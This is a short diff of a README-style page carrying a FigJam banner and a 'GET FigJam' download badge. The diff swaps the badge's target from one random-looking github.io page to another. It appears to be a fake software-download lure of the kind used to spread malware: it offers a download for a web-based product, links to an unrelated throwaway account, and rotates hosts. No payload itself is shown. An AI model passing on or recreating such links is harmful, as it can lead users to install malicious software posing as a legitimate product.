@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://cdn-public.softwarereviews.com/production/logos/offerings/9950/original/FigJamlogo.png)
 
-[![GET FigJam](https://img.shields.io/badge/GET%20%E2%80%94%20FigJam-0078D6?style=for-the-badge&logoColor=white)](https://ericrandallvmhw.github.io/.github/figjam)
+[![GET FigJam](https://img.shields.io/badge/GET%20%E2%80%94%20FigJam-0078D6?style=for-the-badge&logoColor=white)](https://nelsonpageoozi.github.io/.github/figjam)
 
 ---
 
